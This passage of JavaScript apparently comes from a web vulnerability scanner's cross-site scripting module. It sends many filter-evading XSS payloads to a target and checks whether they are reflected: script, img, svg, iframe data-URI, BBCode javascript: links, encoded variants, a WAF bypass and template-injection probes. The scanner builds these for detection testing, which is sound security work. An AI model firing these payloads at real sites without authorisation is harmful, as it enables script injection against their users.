		var CWSbinary = strFromRawData(0x43, 0x57, 0x53, 0x07, 0x0E, 0x30, 0x30, 0x30, 0x78, 0x9C, 0x3D, 0x8D, 0x31, 0x4E, 0xC3, 0x40, 0x10, 0x45, 0xDF, 0xAE, 0x8D, 0xBD, 0x49, 0x08, 0x29, 0xD3, 0x40, 0x1D, 0xA0, 0xA2, 0x05, 0x09, 0x11, 0x89, 0x48, 0x69, 0x50, 0x22, 0x05, 0x44, 0x8B, 0x46, 0x8E, 0x0B, 0x47, 0x26, 0x1B, 0xD9, 0x8E, 0x11, 0x37, 0xA0, 0xA2, 0xDC, 0x82, 0x8A, 0x1B, 0x72, 0x04, 0x58, 0x3B, 0x21, 0x53, 0x8C, 0xFE, 0xCC, 0x9B, 0xF9, 0xFF, 0xAA, 0xCB, 0x37, 0x4A, 0x71, 0xAF, 0x7F, 0xED, 0xF2, 0x2E, 0xF8, 0x01, 0x3E, 0x9E, 0x18, 0x70, 0xC9, 0x63, 0x9A, 0x6C, 0x8B, 0xAC, 0x7A, 0x47, 0xF2, 0xDC, 0xBE, 0x4D, 0xEC, 0xAB, 0x64, 0x6B, 0x6A, 0x1E, 0xAC, 0x2C, 0x9F, 0xA5, 0x28, 0xB1, 0xEB, 0x89, 0x54, 0xC2, 0x4A, 0x6A, 0x29, 0x93, 0x22, 0xDB, 0x54, 0x37, 0x24, 0x9C, 0x8F, 0x48, 0xCB, 0x44, 0x36, 0x29, 0xA3, 0x0B, 0x78, 0x29, 0xAC, 0xAD, 0xD8, 0x92, 0xFB, 0x1F, 0x5C, 0x07, 0x43, 0xAC, 0x7C, 0x80, 0x51, 0xA7, 0x4E, 0x63, 0xF4, 0x62, 0xE8, 0xFA, 0x98, 0x20, 0x62, 0x5F, 0x26, 0x1C, 0x9F, 0x35, 0x20, 0x68, 0xF1, 0xD1, 0x67, 0x0F, 0x14, 0xC1, 0x0A, 0x5D, 0x73, 0x8D, 0x8B, 0x30, 0x51, 0xA8, 0x4C, 0x3C, 0x9B, 0x36, 0xD4, 0x4C, 0xBD, 0x5F, 0xA8, 0x77, 0x7E, 0x9D, 0x5B, 0x17, 0xF3, 0x2F, 0x5B, 0xDC, 0x6D, 0x7B, 0xEF, 0xCB, 0xEF, 0xE6, 0x8D, 0x3A, 0x6E, 0x2D, 0xFB, 0xB3, 0xC3, 0xDD, 0x2E, 0xE3, 0x64, 0x31, 0x64, 0xEC, 0xC7, 0x3F, 0x36, 0xCD, 0x30, 0x09);
		var inputValue = plain2url(CWSbinary);
		if (!this.request(inputValue, true)) return true;
		var pos = this.lastJob.response.body.indexOf(CWSbinary);
		
		// the input is reflected in the beginning 
		if (pos == 0) {			
			this.alertJSONP(inputValue);				
		}		
		return true;
	}
    /**************************************************************************************************************/
    classXSS.prototype.testServerSideTemplateInjectionReflection = function(value, expectedResult)
    {
        if (!this.request(value)) return false;
        if (this.lastJob.response.body.indexOf(expectedResult) != -1)
        {
            return true;
        }
        return false;
    }
        /**************************************************************************************************************/
    classXSS.prototype.testServerSideTemplateInjection = function()
    {
        if (debug) trace("testServerSideTemplateInjection");
        var num1 = 9999000+(Math.floor(Math.random()*1500));
        var num2 = 9999000+(Math.floor(Math.random()*1500));
        //prepare expected results
        var inputValue = "{{" + num1 + "*" + num2 + "}}";
        var expectedResult = (num1*num2).toString();
        if (this.testServerSideTemplateInjectionReflection(inputValue, expectedResult))
        {
            // confirm it
            num1 = 500000+(Math.floor(Math.random()*1500));
            num2 = 500000+(Math.floor(Math.random()*1500));
            inputValue = "{{" + num1 + "*" + num2 + "}}";
            expectedResult = (num1*num2).toString();
            if (this.testServerSideTemplateInjectionReflection(inputValue, expectedResult)) {
                // report it
                if (debug) logError("testServerSideTemplateInjectionReflection: " + expectedResult);
                this.alertServerSideTemplateInjection(inputValue, expectedResult);
            }
        }
    }
	
	/**************************************************************************************************************/
	classXSS.prototype.testScriptTagNullCharASPNET_v11_Injection = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
		var inputValue = this.origValue + "<\x00ScRiPt \r\n>" + script_payload + "(" + rndStr + ")" + script_end_tag;
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=\x00script|textwithin=" + script_payload + "(" + rndStr + ")")) {
			this.alert(inputValue);				
			return false;
		}		
		return true;
	}
	/**************************************************************************************************************/
	classXSS.prototype.testBBCODE = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
       
        // first, let's see if a href is accepted
        var ahrefAccepted = false;
        var inputValue = "[url=http://www.vulnweb.com][/url]";
        if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=a|href=http://www.vulnweb.com")) ahrefAccepted = true;
        
        if (ahrefAccepted) {
            var variants = Array(
            	"[url=javascript:prompt(${random})]${random}[/url]",
                "[url= javascript:prompt(${random})]${random}[/url]",
                "[url=javascript&colon;prompt(${random})]${random}[/url]",
                "[url=javascript&#x3A;prompt(${random})]${random}[/url]",
                "[url=j&#x61;v&#x41;sc&#x52;ipt&#x3A;prompt(${random})]${random}[/url]",
                "[url=data:text/html,%3CsCript%3Eprompt(${random})%3C/scRipt%3E]${random}[/url]",
                "[url=data:_;;;:;base64_______,${base64encodescript}]${random}[/url]",
                "[url=feed:javascript&colon;prompt(${random})]${random}[/url]"
            );
            
            for (var i=0; i<variants.length;i++) {
                var rndStr = 9000 + random(999);		
                var b64script = plain2b64("<sCrIpt >prompt(" + rndStr + ")< /ScRipT>");
                var inputValue = variants[i].replace("${random}", rndStr).replace("${random}", rndStr);
                inputValue = inputValue.replace("${base64encodescript}", b64script);
                
                if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
                var hq = new THTMLQuery(this.lastJob.response.body);
                if (
                        hq.executeHtmlQuery("tag=a|href=javascript:prompt(" + rndStr + ")") ||
                        hq.executeHtmlQuery("tag=a|href=feed:javascript&colon;prompt(" + rndStr + ")") ||
                        hq.executeHtmlQuery("tag=a|href=javascript&colon;prompt(" + rndStr + ")") ||
                        hq.executeHtmlQuery("tag=a|href=javascript&#x3A;prompt(" + rndStr + ")") ||
                        hq.executeHtmlQuery("tag=a|href=j&#x61;v&#x41;sc&#x52;ipt&#x3A;prompt(" + rndStr + ")") ||
                        hq.executeHtmlQuery("tag=a|href=data:text/html,<sCript>prompt(" + rndStr + ")</scRipt>") ||
                        hq.executeHtmlQuery("tag=a|href=data:_;;;:;base64_______," + b64script)
                    )                     
                {
                    this.alert(inputValue);				
			        return false;
                }
            }
        }        
		return true;
	}	    	
	
	/**************************************************************************************************************/
	classXSS.prototype.testDjangoStripTags = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
		var inputValue = this.origValue + "<img<!-- --> src=x onerror=alert(" + rndStr + ");//><!-- -->";
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=img|onerror=alert(" + rndStr + ");/")) {
			this.alert(inputValue);				
			return false;
		}		
		return true;
	}
	
	/**************************************************************************************************************/
	classXSS.prototype.testDivTagWithExpressionInjection = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
		var inputValue = this.origValue + "<div style=width:expression(" + script_payload + "(" + rndStr + "))>";
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=div|style=width:expression(" + script_payload + "(" + rndStr + "))")) {
			this.alert(inputValue);				
			return false;
		}		
		return true;
	}		
	
	/**************************************************************************************************************/
	classXSS.prototype.testInsideStyleTag = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
        
        var inputValue = this.origValue + "}body{acu:Expre/**/SSion(" + script_payload + "(" + rndStr + "))}";
        
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=style|textwithin<acu:Expre/**/SSion(" + script_payload + "(" + rndStr + "))")) {
            this.manualConfirmationRequired = true;
            this.alert(inputValue);
			return false;
		}
		return true;
	}    	
	
	/**************************************************************************************************************/
	classXSS.prototype.testIFrameWithDataUrl = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
		var inputValue = this.origValue + "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo=' invalid='"+ rndStr + "'>";
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=iframe|src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo=|invalid=" + rndStr)) {
			this.alert(inputValue);				
			return false;
		}		
		return true;
	}
				
	/**************************************************************************************************************/
	classXSS.prototype.testBodyOnLoad = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
		var inputValue = this.origValue + "<body onload=" + script_payload + "("+ rndStr + ")>";
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=body|onload=" + script_payload + "(" + rndStr + ")")) {
			this.alert(inputValue);				
			return false;
		}		
		return true;
	}	
	/**************************************************************************************************************/
	classXSS.prototype.testImgOnLoad = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);	
        var inputValue = null;		
        
        if (this.classXSSInURI) inputValue = this.origValue + "<img/src=\"//testasp.vulnweb.com/t/dot.gif\"onload=" + script_payload + "("+ rndStr + ")>";
		else inputValue = this.origValue + "<img src=//testasp.vulnweb.com/t/dot.gif onload=" + script_payload + "("+ rndStr + ")>";
        
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=img|src=//testasp.vulnweb.com/t/dot.gif|onload=" + script_payload + "(" + rndStr + ")")) {
			this.alert(inputValue);				
			return false;
		}		
		return true;
	}
    /**************************************************************************************************************/
    classXSS.prototype.testContentEditable = function()
    {
        // if returns false it will stop testing the current variation for the rest of tests
        var rndStr = 9000 + random(999);
        var inputValue = this.origValue + "<% contenteditable onresize=" + script_payload + "(" + rndStr+ ")>";
        if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
        var hq = new THTMLQuery(this.lastJob.response.body);
        if (hq.executeHtmlQuery("tag=%|onresize=" + script_payload + "(" + rndStr + ")")) {
            this.alert(inputValue);
            return false;
        }
        return true;
    }
	/**************************************************************************************************************/
	classXSS.prototype.testImgSrcError = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);	
        var inputValue = null;		
        
        inputValue = this.origValue + "<img src=xyz OnErRor=" + script_payload + "("+ rndStr + ")>";
        
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=img|src=xyz|onerror=" + script_payload + "(" + rndStr + ")")) {
			this.alert(inputValue);				
			return false;
		}		
		return true;
	}
	/**************************************************************************************************************/
	classXSS.prototype.testImgSrcError2 = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);	
        var inputValue = null;		
        
        inputValue = this.origValue + "<img/src=\">\" onerror=alert("+ rndStr + ")>";
        
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=IMG/SRC\=\"|textwithin<onerror\=")) {
			this.alert(inputValue, true);				
			return false;
		}		
		return true;
	}
	/**************************************************************************************************************/
	classXSS.prototype.testInputAutoFocus = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);	
        var inputValue = null;		
        
        inputValue = this.origValue + "<input autofocus onfocus=" + script_payload + "("+ rndStr + ")>";
        
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=input|onfocus=" + script_payload + "(" + rndStr + ")")) {
			this.alert(inputValue);
			return false;
		}		
		return true;
	}	
	/**************************************************************************************************************/
	classXSS.prototype.testVideo = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);	
        var inputValue = null;		
        
        inputValue = this.origValue + '<video><source onerror="javascript:' + script_payload + '('+ rndStr + ')">';
        
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=source|onerror=javascript:" + script_payload + "(" + rndStr + ")")) {
			this.alert(inputValue);
			return false;
		}		
		return true;
	}
	/**************************************************************************************************************/
	classXSS.prototype.testSVG = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);	
        var inputValue = null;		
        
        inputValue = this.origValue + '<svg\x09\x0A\x0B\x0C\x0D\xA0\x00onload=' + script_payload + '(' +  rndStr + ');>';
        
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=svg|onload=" + script_payload + "(" + rndStr + ");")) {
			this.alert(inputValue);
			return false;
		}
		return true;
	}
	
	/**************************************************************************************************************/
	classXSS.prototype.testSVGDoubleEncoded = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);	
        var inputValue = null;		
        
        // encoded it again 
        inputValue = encodeURIComponent(this.origValue + '<svg onload=' + script_payload + '(' +  rndStr + ')>');
        
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=svg|onload=" + script_payload + "(" + rndStr + ")")) {
			this.alert(inputValue);
			return false;
		}		
		return true;
	}	
	/**************************************************************************************************************/
	classXSS.prototype.testDoubleEncoded = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
		var inputValue = plain2urlAll(this.origValue + "<ScRiPt >" + script_payload + "(") + rndStr + plain2urlAll(")</sCripT>");
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "(" + rndStr + ")")
            || hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "('" + rndStr + "')")
            || hq.executeHtmlQuery('tag=script|textwithin=' + script_payload + '("' + rndStr + '")'))
            {			
			    this.alert(inputValue);	
			    return false;
		    }	
		return true;
	}
    /**************************************************************************************************************/
    classXSS.prototype.testUnicodeDecoded = function()
    {
        // if returns false it will stop testing the current variation for the rest of tests
        var rndStr = 9000 + random(999);
        var inputValue = this.origValue + "\\u003CScRiPt\\" + script_payload + "(" + rndStr + ")\\u003C/sCripT\\u003E";
        if (!this.request(inputValue, true)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
        var hq = new THTMLQuery(this.lastJob.response.body);
        if (hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "(" + rndStr + ")")
            || hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "('" + rndStr + "')")
            || hq.executeHtmlQuery('tag=script|textwithin=' + script_payload + '("' + rndStr + '")'))
        {
            this.alert(inputValue);
            return false;
        }
        return true;
    }
	/**************************************************************************************************************/
	classXSS.prototype.testHTMLEncoded = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
		var inputValue = this.origValue + plain2html("<ScRiPt>" + script_payload + "(") + rndStr + plain2html(")</sCripT>");
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "(" + rndStr + ")")
            || hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "('" + rndStr + "')")
            || hq.executeHtmlQuery('tag=script|textwithin=' + script_payload + '("' + rndStr + '")'))
            {			
			    this.alert(inputValue);	
			    return false;
		    }	
		return true;
	}			
	
	/**************************************************************************************************************/
	classXSS.prototype.testUnicodeImg = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
		var inputValue = "\xF6<img acu onmouseover=" + script_payload + "(" + rndStr + ") //\xF6>";
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=img|onmouseover=" + script_payload + "(" + rndStr + ")")) {
			this.alert(inputValue);				
			return false;
		}		
		return true;
	}		
	/**************************************************************************************************************/
	classXSS.prototype.testInsideParamInjection = function(quote)
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
        
        var inputValue = null;
        if (this.classXSSInURI) inputValue = this.origValue + quote + "onmouseover='" + script_payload + "(" + rndStr + ")'" + "bad=" + quote;
        else inputValue = this.origValue + quote + " onmouseover=" + script_payload + "(" + rndStr + ") bad=" + quote;
        
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=*|onmouseover=" + script_payload + "(" + rndStr + ")")) {
			this.alert(inputValue);				
			return false;
		}
		// WAF bypass
		var payload = "[!+!]";
		payload = payload.toUpperCase();
		var attrName = randStr(4);
		var attrNameBad = randStr(3);
		var inputValue = null;
		if (this.classXSSInURI) inputValue = this.origValue + quote + attrName + "='" + script_payload + "(" + payload + ")'" + attrNameBad + "=" + quote;
		else inputValue = this.origValue + quote + " " + attrName + "=" + script_payload + "(" + payload + ") " + attrNameBad + "=" + quote;
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
		//don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
		if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
			var locationStr = this.lastJob.response.headerValue('location');
			if (locationStr) return true;
		}
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=*|" + attrName + "=" + script_payload + "(" + payload + ")")) {
			this.alert(inputValue);
			return false;
		}
        return true;
	}
    /**************************************************************************************************************/
    classXSS.prototype.testInsideParamInjectionUnicodeEncoded = function(quote)
    {
        // if returns false it will stop testing the current variation for the rest of tests
        var rndStr = 9000 + random(999);
        if (quote=="'") quote = "\\u0027";
        else if (quote=='"') quote = "\\u0022";
        var inputValue = null;
        if (this.classXSSInURI) inputValue = this.origValue + quote + "onmouseover='" + script_payload + "(" + rndStr + ")'" + "bad=" + quote;
        else inputValue = this.origValue + quote + " onmouseover=" + script_payload + "(" + rndStr + ") bad=" + quote;
        if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
        var hq = new THTMLQuery(this.lastJob.response.body);
        if (hq.executeHtmlQuery("tag=*|onmouseover=" + script_payload + "(" + rndStr + ")")) {
            this.alert(inputValue);
            return false;
        }
        return true;
    }
    /**************************************************************************************************************/
    classXSS.prototype.testInsideParamInjectionDoubleEncoded = function(quote)
    {
        // if returns false it will stop testing the current variation for the rest of tests
        var rndStr = 9000 + random(999);
        var inputValue = null;
        if (this.classXSSInURI) inputValue = this.origValue + quote + "onmouseover='" + script_payload + "(" + rndStr + ")'" + "bad=" + quote;
        else inputValue = this.origValue + quote + " onmouseover=" + script_payload + "(" + rndStr + ") bad=" + quote;
        var encodedInputValue = plain2urlAll(inputValue);
        if (!this.request(encodedInputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
        var hq = new THTMLQuery(this.lastJob.response.body);
        if (hq.executeHtmlQuery("tag=*|onmouseover=" + script_payload + "(" + rndStr + ")")) {
            this.alert(encodedInputValue);
            return false;
        }
        return true;
    }
    /**************************************************************************************************************/
	classXSS.prototype.testInsideQuotesCloseScriptTag = function(quote)
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
        var inputValue = this.origValue + quote + "><script>" + script_payload + "(" + rndStr + ")</script>";
        
		if (!this.request(inputValue, true)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "(" + rndStr + ")")) {
			this.alert(inputValue);				
			return false;
		}		
		return true;
	}   
	
	/**************************************************************************************************************/
	classXSS.prototype.testUnicodeInsideQuotes = function(quote)
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
		var inputValue = "\xF6" + quote + " onmouseover=" + script_payload + "(" + rndStr + ") //";
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=*|onmouseover=" + script_payload + "(" + rndStr + ")")) {
			this.alert(inputValue);				
			return false;
		}		
		return true;
	}	
    
	/**************************************************************************************************************/
	classXSS.prototype.testInsideParamInjectionStyleVariant = function(quote)
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
        
        var inputValue = this.origValue + quote + "sTYLe='acu:Expre/**/SSion(" + script_payload + "(" + rndStr + "))'" + "bad=" + quote;
        
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=*|sTYLe=acu:Expre/**/SSion(" + script_payload + "(" + rndStr + "))")) {
			this.alert(inputValue);
			return false;
		}		
		return true;
	}    
	
	/**************************************************************************************************************/
	classXSS.prototype.testInsideTitleInjection = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
		var inputValue = this.origValue + "</title>" + script_start_tag + script_payload + "(" + rndStr + ")" + script_end_tag;
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "(" + rndStr + ")")
            || hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "('" + rndStr + "')")
            || hq.executeHtmlQuery('tag=script|textwithin=' + script_payload + '("' + rndStr + '")'))
            {			
			    this.alert(inputValue);	
			    return false;
		    }		
		return true;
	}	
	/**************************************************************************************************************/
	classXSS.prototype.testInsideTextareaInjection = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
		var inputValue = this.origValue + "</textarea>" + script_start_tag + script_payload + "(" + rndStr + ")" + script_end_tag;
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "(" + rndStr + ")")
            || hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "('" + rndStr + "')")
            || hq.executeHtmlQuery('tag=script|textwithin=' + script_payload + '("' + rndStr + '")'))
            {			
			    this.alert(inputValue);	
			    return false;
		    }	
		return true;
	}		
	
	/**************************************************************************************************************/
	classXSS.prototype.testInsideCommentInjection = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
